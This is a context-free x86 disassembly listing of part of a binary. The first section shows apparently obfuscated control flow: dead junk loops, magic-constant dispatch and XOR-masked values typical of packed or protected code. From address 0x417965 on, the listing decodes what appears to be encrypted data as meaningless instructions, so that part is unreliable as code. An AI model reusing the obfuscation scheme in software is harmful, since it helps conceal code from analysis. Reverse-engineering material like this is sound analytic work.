  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     dh,BYTE PTR [ecx]
  417972:	inc    ecx
  417973:	sbb    BYTE PTR [esp+eax*4-0x17848548],0x9c
  41797b:	jnp    0x4179f8
  41797d:	arpl   cx,si
  41797f:	adc    BYTE PTR es:[edx+0x2a59d9d],bh
  417986:	clc    
  417987:	std    
  417988:	test   al,0xcd
  41798a:	clc    
  41798b:	repz or al,0x6f
  41798e:	mov    dh,0x24
  417990:	fisub  WORD PTR [edx+0x1a]
  417993:	cmp    ebx,ebx
  417995:	fcmovnu st,st(3)
  417997:	push   esp
  417998:	add    cl,BYTE PTR [eax-0x4]
  41799b:	inc    edx
  41799c:	add    BYTE PTR [edx-0x41],cl
  41799f:	scas   eax,DWORD PTR es:[edi]
  4179a0:	inc    esi
  4179a1:	or     al,0xf3
  4179a3:	aas    
  4179a4:	add    DWORD PTR [eax],esp
  4179a6:	dec    esp
  4179a7:	mov    WORD PTR [edx],ss
  4179a9:	aaa    
  4179aa:	scas   eax,DWORD PTR es:[edi]
  4179ab:	mov    bl,0x35
  4179ad:	mov    ebx,0x96b046a2
  4179b2:	cmp    DWORD PTR [edx-0x7d06342c],ecx
  4179b8:	mov    ebx,0xd5bc779c
  4179bd:	test   DWORD PTR [ebp+edi*8-0x74],edx
  4179c1:	mov    al,0x13
  4179c3:	aam    0xbe
  4179c5:	push   ss
  4179c6:	sbb    al,0xd
  4179c8:	outs   dx,BYTE PTR ds:[esi]
  4179c9:	out    0x6b,al
  4179cb:	loope  0x4179d4
  4179cd:	jg     0x4179a2
  4179cf:	icebp  
  4179d0:	pop    esi
  4179d1:	int    0x67
  4179d3:	jne    0x417a4b
  4179d5:	xor    cl,BYTE PTR [ebp+ecx*1+0x3c]
  4179d9:	popa   
  4179da:	sbb    al,0x6b
  4179dc:	xor    eax,0x559fd671
  4179e1:	xbegin 0xe0052554
  4179e7:	(bad)  
  4179e8:	lods   al,BYTE PTR ds:[esi]
  4179e9:	adc    eax,0xefd7a19c
  4179ee:	es xchg ecx,eax
  4179f0:	push   eax
  4179f1:	mov    ch,cl
  4179f3:	jge    0x4179a1
  4179f5:	mov    dh,0x5
  4179f7:	test   edx,0x1fd808ac
  4179fd:	shr    DWORD PTR [ebx],cl
  4179ff:	mov    ecx,0xfa791dae
  417a04:	sbb    eax,ecx
  417a06:	shl    DWORD PTR [ebp+eax*1+0x788c6cea],1
  417a0d:	xor    eax,0x2ad5713
  417a12:	cmp    BYTE PTR [edi+0x26],ah
  417a15:	mov    ecx,0x2079772a
  417a1a:	jmp    0xe701:0xbecfc244
  417a21:	adc    DWORD PTR [edx],edi
  417a23:	jmp    0x4179cc
  417a25:	pusha  
  417a26:	push   es
  417a27:	jle    0x4179c1
  417a29:	cld    
  417a2a:	and    al,0x72
  417a2c:	xchg   DWORD PTR [eax],esp
  417a2e:	scas   eax,DWORD PTR es:[edi]
  417a2f:	lahf   
  417a30:	mov    esi,0x4a355215
  417a35:	sti    
  417a36:	adc    al,0x20
  417a38:	aam    0x0
  417a3a:	pop    ss
  417a3b:	cmp    esp,esp
  417a3d:	test   al,0x4b
  417a3f:	mov    bl,0x99
  417a41:	fwait
  417a42:	sbb    DWORD PTR [edi],edx
  417a44:	and    dl,BYTE PTR [esp+edi*4]
  417a47:	mov    esp,0xd4f59f16
  417a4c:	mov    ecx,0x1b4f0a4b
  417a51:	adc    ch,0x33
  417a54:	outs   dx,DWORD PTR ds:[esi]
  417a55:	mov    bh,ch
  417a57:	(bad)  
  417a58:	push   edi
  417a59:	mov    BYTE PTR [edx],cl
  417a5b:	jg     0x4179f5
  417a5d:	ss xor eax,ebp
  417a60:	jg     0x417a0b
  417a62:	adc    eax,0x4b68e1d3
  417a67:	push   ds
  417a68:	cmp    DWORD PTR ds:0xf808be71,ebp
  417a6e:	fnstenv ds:0x7f224cb0
  417a74:	gs push 0xb7c796e5
  417a7a:	jnp    0x417a3f
  417a7c:	mov    dl,0x6e
  417a7e:	in     eax,0xb9
  417a80:	stc    
  417a81:	mov    bh,0x21
  417a83:	shr    BYTE PTR [ecx+0x4a],0xc8
  417a87:	sbb    edi,DWORD PTR [esp+edx*1+0x42]
  417a8b:	loop   0x417a75
  417a8d:	dec    esp
  417a8e:	sub    BYTE PTR [ebx],bl
  417a90:	retf   
  417a91:	bound  ebp,QWORD PTR [edi-0x46]
  417a94:	imul   esi,DWORD PTR [ecx],0xffffffa6
  417a97:	aas    
  417a98:	inc    eax
  417a99:	inc    edi
  417a9a:	inc    esi
  417a9b:	pop    esi
  417a9c:	mov    eax,0x244a62f2
  417aa1:	add    bl,BYTE PTR [edx]
  417aa3:	in     al,0xdb
  417aa5:	jmp    0x1f784d98
  417aaa:	mov    ecx,0x94b5fb5d
  417aaf:	inc    ebx
  417ab0:	outs   dx,DWORD PTR ds:[esi]
  417ab1:	xor    DWORD PTR [ebx],0x3e
  417ab4:	adc    eax,DWORD PTR [ecx+0x4008d29b]
  417aba:	jne    0x417b2f
  417abc:	xor    dh,dl
  417abe:	sub    DWORD PTR [edi-0x79261c74],0xc99fb565
  417ac8:	arpl   WORD PTR [ecx],dx
  417aca:	jnp    0x417aca
  417acc:	fnsave [ecx]
  417ace:	xchg   BYTE PTR [ebp-0x5a7fc9d7],bh
  417ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ad5:	xchg   ebx,eax
  417ad6:	sub    eax,esp
  417ad8:	mov    edx,0xefd8a270
  417add:	out    dx,eax
  417ade:	aad    0x11
  417ae0:	dec    ebx
  417ae1:	in     al,0x16
  417ae3:	ror    DWORD PTR [esi-0x6a],0xae
  417ae7:	xchg   edi,eax
  417ae8:	mov    dl,BYTE PTR [esi-0x58c2f7d6]
  417aee:	(bad)  
  417aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417af0:	xor    bl,0x4a
  417af3:	xchg   edx,eax
  417af4:	push   ebx
  417af5:	xchg   ebx,esp
  417af7:	(bad)  
  417af8:	cdq    
  417af9:	aaa    
  417afa:	repz imul edi,DWORD PTR fs:[esi],0x46
  417aff:	xlat   BYTE PTR ds:[ebx]
  417b00:	lock psllw mm6,QWORD PTR [edx+ebx*8]
  417b05:	adc    DWORD PTR [edx+edx*4],esp
  417b08:	arpl   WORD PTR ds:0xba2056ae,di
  417b0e:	jo     0x417ab6
  417b10:	lea    eax,[edi-0x314540e8]
  417b16:	fwait
  417b17:	cwde   
  417b18:	dec    ebx
  417b19:	lahf   
  417b1a:	mov    dh,0x8c
  417b1c:	outs   dx,DWORD PTR ds:[esi]
  417b1d:	adc    edi,esi
  417b1f:	inc    ebp
  417b20:	add    BYTE PTR [esi-0x7460cf3],cl
  417b26:	inc    ebx
  417b27:	aas    
  417b28:	loop   0x417b53
  417b2a:	test   eax,0x7f464054
  417b2f:	cmc    
  417b30:	mov    gs,WORD PTR [ebx-0x7577f947]
  417b36:	inc    edx
  417b37:	add    eax,0xdc8cd015
  417b3c:	inc    eax
  417b3d:	or     ebx,edi
  417b3f:	out    dx,al
  417b40:	enter  0xfb40,0xc2
  417b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b45:	(bad)
  417b48:	clc    
  417b49:	xchg   ebp,eax
  417b4a:	adc    eax,0x34c57eee
  417b4f:	enter  0x3793,0x83
  417b53:	xchg   esi,eax
  417b54:	out    0x65,eax
  417b56:	in     eax,dx
  417b57:	mov    dl,BYTE PTR [ebx-0x22432ffb]
  417b5d:	cwde   
  417b5e:	add    BYTE PTR [esi+edi*8+0x71],bh
  417b62:	and    dh,BYTE PTR [edx]
  417b64:	adc    eax,0x82cb7a3f
  417b69:	outs   dx,BYTE PTR ds:[esi]
  417b6a:	sub    DWORD PTR [ebx-0x674f7e3c],ecx
  417b70:	add    BYTE PTR [edx+eax*8],ch
  417b73:	rcl    BYTE PTR [eax+0x4b5917eb],0x1f
  417b7a:	mov    edi,0xc2683d67
  417b7f:	cmp    DWORD PTR [edi],ebp
  417b81:	out    dx,eax
  417b82:	imul   eax,ebx,0x7e
  417b85:	test   DWORD PTR [ebx-0x40babaad],ecx
  417b8b:	shl    DWORD PTR [ebp+eax*8+0x21],0x95
  417b90:	mov    cl,0x93
  417b92:	mov    eax,0xd1546774
  417b97:	mov    esp,0x10874fcb
  417b9c:	jp     0x417b35
  417b9e:	and    edi,ecx
  417ba0:	mov    al,0x76
  417ba2:	out    0xea,eax
  417ba4:	out    dx,eax
  417ba5:	(bad)  
  417ba6:	shl    DWORD PTR [ebp+0x7c],1
  417ba9:	inc    ebp
  417bab:	retf   
  417bac:	inc    esi
  417bad:	lods   al,BYTE PTR ds:[esi]
  417bae:	call   FWORD PTR [ebx]
  417bb0:	pop    ecx
  417bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb2:	shr    BYTE PTR [ebp+0x67a464fb],cl
  417bb8:	mov    edx,0xbe9158d8
  417bbd:	sbb    al,0x82
  417bbf:	xor    eax,0xf6c594c1
  417bc4:	in     al,dx
  417bc5:	dec    ecx
  417bc6:	adc    bl,ah
  417bc8:	fistp  QWORD PTR [edi]
  417bca:	in     eax,dx
  417bcb:	clc    
  417bcc:	cmc    
  417bcd:	jl     0x417b76
  417bcf:	inc    esp
  417bd0:	shl    esp,cl
  417bd2:	add    esp,0xffffffc5
  417bd5:	inc    edi
  417bd6:	in     al,0x6c
  417bd8:	jno    0x417c1f
  417bda:	mov    esp,0x3471b0aa
  417bdf:	test   DWORD PTR [ecx],ecx
  417be1:	add    edi,DWORD PTR [ecx+0x5e93c6bd]
  417be7:	jge    0x417bce
  417be9:	push   edx
  417bea:	test   eax,0x1423c8c
  417bef:	xbegin 0x5f76eb25
  417bf5:	fldenv [eax]
  417bf7:	outs   dx,DWORD PTR ds:[esi]
  417bf8:	ret    0xe15e
  417bfb:	aam    0x87
  417bfd:	xchg   BYTE PTR [esi],al
  417bff:	pop    edi
  417c00:	into   
  417c01:	or     cl,BYTE PTR [ebx+ebx*1-0x7f2fab8f]
  417c08:	(bad)  [esi+ebp*8+0x39]
  417c0c:	jno    0x417c0e
  417c0e:	xor    al,0xc4
  417c10:	inc    edi
  417c11:	xchg   ebx,eax
  417c12:	inc    edi
  417c13:	sbb    BYTE PTR [edi-0x6c],dh
  417c16:	jbe    0x417c4b
  417c18:	sbb    eax,0x286a6f80
  417c1d:	mov    bh,0xfc
  417c1f:	sbb    DWORD PTR [edi-0x74ba874d],0x1d
  417c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c27:	(bad)  
  417c28:	mov    dh,0x88
  417c2a:	in     eax,0x15
  417c2c:	push   esp
  417c2d:	mov    DWORD PTR [ecx],edi
  417c2f:	mov    ebp,cr0
  417c32:	add    DWORD PTR [esi+0x14cc5e9d],esi
  417c38:	into   
  417c39:	jae    0x417c81
  417c3b:	xchg   esi,eax
  417c3c:	cmp    al,0x95
  417c3e:	add    eax,edx
  417c40:	add    al,0x27
  417c42:	jno    0x417c26
  417c44:	ins    DWORD PTR es:[edi],dx
  417c45:	xchg   BYTE PTR es:[ecx],ch
  417c48:	scas   al,BYTE PTR es:[edi]
  417c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c4a:	out    dx,al
  417c4b:	dec    esi
  417c4c:	mov    dh,0x2c
  417c4e:	pop    es
  417c4f:	pop    ds
  417c50:	cmc    
  417c51:	iret   
  417c52:	adc    DWORD PTR [eax-0x2],esp
  417c55:	mov    cl,0x6c
  417c57:	loop   0x417c40
  417c59:	push   esi
  417c5a:	cmc    
  417c5b:	xchg   edx,eax
  417c5c:	gs jno 0x417c50
  417c5f:	imul   esp,eax,0x59b79feb
  417c65:	jbe    0x417c08
  417c67:	sahf   
  417c68:	sub    cl,BYTE PTR [edx]
  417c6a:	mov    dl,al
  417c6c:	popa   
  417c6d:	fwait
  417c6e:	call   0x2c73dda0
  417c73:	adc    ch,BYTE PTR [edx+0x158a679c]
  417c79:	push   esi
  417c7a:	inc    edx
  417c7b:	and    DWORD PTR [ebx+0x6b],ebx
  417c7e:	sub    cl,ah
  417c80:	outs   dx,DWORD PTR ds:[esi]
  417c81:	(bad)  
  417c82:	dec    BYTE PTR [edi]
  417c84:	enter  0x6de,0x5d
  417c88:	retf   0xa2bc
  417c8b:	outs   dx,DWORD PTR ds:[esi]
  417c8c:	inc    esi
  417c8d:	mov    ecx,0x9215a44a
  417c92:	xchg   DWORD PTR [eax+0x65],ebx
  417c95:	iret   
  417c96:	or     eax,0xec020a98
  417c9b:	mov    ebx,0x7468b8f1
  417ca0:	mov    ah,0x9a
  417ca2:	pop    ss
  417ca3:	pop    ecx
  417ca4:	subps  xmm3,XMMWORD PTR [esi+0x2734c464]
  417cab:	add    BYTE PTR [ebx+eax*4-0x48],bh
  417caf:	or     eax,0x5eb0e946
  417cb4:	inc    ebp
  417cb5:	ficom  WORD PTR [esi-0xb37ffb7]
  417cbb:	nop
  417cbc:	andnps xmm6,xmm5
  417cbf:	jge    0x417c74
  417cc1:	stc    
  417cc2:	xchg   esi,eax
  417cc3:	add    cl,BYTE PTR [esi+0x42f79839]
  417cc9:	sbb    DWORD PTR [ecx],edi
  417ccb:	icebp  
  417ccc:	inc    eax
  417ccd:	dec    ecx
  417cce:	ret    0x8ed8
  417cd1:	or     eax,0x765f433
  417cd6:	push   es
  417cd7:	pop    edi
  417cd8:	ins    BYTE PTR es:[edi],dx
  417cd9:	add    al,0xe0
  417cdb:	sar    BYTE PTR [ebp+0x39171d36],cl
  417ce1:	and    esi,DWORD PTR [ebp+0x54]
  417ce4:	mov    ebp,0x1dede095
  417ce9:	(bad)  
  417cea:	cmp    eax,0x911ba9dc
  417cef:	xor    al,0xe
  417cf1:	adc    DWORD PTR ds:0xccb3c022,esi
  417cf7:	pop    edx
  417cf8:	sti    
  417cf9:	ret    0x9fb9
  417cfc:	sub    DWORD PTR [esi+0x3f69d66d],0x1a6f3182
  417d06:	mov    dl,0xd
  417d08:	out    0xd9,al
  417d0a:	call   0xba7e:0xeebcad5f
  417d11:	int    0xbc
  417d13:	mov    dh,0xbb
  417d15:	lock xor eax,0xdf5a518d
  417d1b:	popf   
  417d1c:	sar    esi,1
  417d1e:	scas   al,BYTE PTR es:[edi]
  417d1f:	arpl   di,si
  417d21:	aam    0x55
  417d23:	mov    bl,0xa0
  417d25:	sahf   
  417d26:	mov    ds:0x90bba054,eax
  417d2b:	add    bx,WORD PTR [edx]
  417d2e:	jge    0x417ccd
  417d30:	add    eax,0x41cfda47
  417d35:	hlt    
  417d36:	and    eax,0x186f7b55
  417d3b:	or     cl,BYTE PTR [ebp+0x24]
  417d3e:	outs   dx,BYTE PTR ds:[esi]
  417d3f:	and    BYTE PTR [eax+0x70abdb85],0xa
  417d46:	aas    
  417d47:	(bad)  
  417d48:	cmp    al,0xee
  417d4a:	add    esp,DWORD PTR [esi]
  417d4c:	sub    BYTE PTR [ebx+eax*1-0x55],0xd9
  417d51:	jbe    0x417d91
  417d53:	mov    ebp,0xdd61f649
  417d58:	inc    ebx
  417d59:	inc    ecx
  417d5a:	jle    0x417cfb
  417d5c:	pop    ecx
  417d5d:	jl     0x417d25
  417d5f:	pop    ebp
  417d60:	push   0xfffffff2
  417d62:	std    
  417d63:	and    ebx,ecx
  417d65:	fwait
  417d66:	adc    esp,DWORD PTR [eax]
  417d68:	or     eax,0x15561e5f
  417d6d:	pop    ds
  417d6e:	adc    ah,BYTE PTR [esi+eiz*4+0x7]
  417d72:	cmp    ecx,ebp
  417d74:	push   esp
  417d75:	je     0x417d74
  417d77:	sbb    edi,edx
  417d79:	std    
  417d7a:	mov    ebx,0x495def42
  417d7f:	das    
  417d80:	fcmovnbe st,st(0)
  417d82:	jns    0x417d0c
  417d84:	mov    eax,0x68a6a10e
  417d89:	push   ebx
  417d8a:	stos   BYTE PTR es:[edi],al
  417d8b:	jge    0x417dc3
  417d8d:	and    ch,BYTE PTR [edx+0x3a]
  417d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d91:	push   edx
  417d92:	xor    ah,BYTE PTR [ebp+0x41d81502]
  417d98:	lods   al,BYTE PTR ds:[esi]
  417d99:	test   al,0x16
  417d9b:	scas   eax,DWORD PTR es:[edi]
  417d9c:	or     ch,BYTE PTR [esi-0x1394e80f]
  417da2:	xchg   ecx,eax
  417da3:	rcr    BYTE PTR [esi+esi*8+0x2f],cl
  417da7:	xchg   ebp,eax
  417da8:	add    al,0xb4
  417daa:	ins    DWORD PTR es:[edi],dx
  417dab:	in     eax,dx
  417dac:	jbe    0x417d76
  417dae:	push   cs
  417daf:	inc    edx
  417db0:	jmp    0x74f5:0x63b77e4
  417db7:	adc    bh,cl
  417db9:	aas    
  417dba:	xchg   ebx,eax
  417dbb:	enter  0x9d1c,0x74
  417dbf:	mov    ds:0xf8e9744c,eax
  417dc4:	pop    ecx
  417dc5:	es fs in eax,dx
